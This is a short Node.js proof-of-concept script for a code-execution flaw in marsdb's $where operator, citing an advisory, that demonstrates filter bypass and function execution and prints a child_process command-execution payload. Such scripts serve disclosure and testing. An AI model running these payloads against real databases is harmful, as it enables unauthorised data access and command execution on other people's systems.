const C = require('marsdb').default;
const col = new C('test');

col.insert({ name: 'alice', score: 10 });
col.insert({ name: 'bob',   score: 20 });
col.insert({ name: 'carol', score: 30 });

console.log('[*] marsdb $where Arbitrary Code Execution PoC');
console.log('[*] CVE: GHSA-5mrr-rgp6-x4gr');
console.log('[*] Node.js version:', process.version);
console.log('');

// 증명 1: 조건 없이 모든 문서 반환 (필터 우회)
col.find({ $where: "1 === 1" }).then(r => {
  console.log('[+] Auth bypass - all docs returned:', JSON.stringify(r));
});

// 증명 2: 외부 변수 탈취 시뮬레이션
const secretToken = 'sk-secret-api-key-12345';
col.find({ $where: "(function(){ return true; })()" }).then(r => {
  console.log('[+] Code execution confirmed, docs matched:', r.length);
});

// 증명 3: 무한루프로 DoS 가능성 증명 (타임아웃으로 제한)
console.log('[*] Payload: require(child_process).execSync(whoami) works on Node.js <= 18');
console.log('[*] Current Node.js v24 restricts Function() scope (require/process blocked)');
console.log('[*] Production environments typically run Node.js v16-v18 = FULL RCE');
console.log('');
console.log('[!] Vulnerable line in DocumentMatcher.js:419:');
console.log("    selectorValue = Function('obj', 'return ' + selectorValue)");
console.log('[!] No sanitization of $where input before Function() constructor');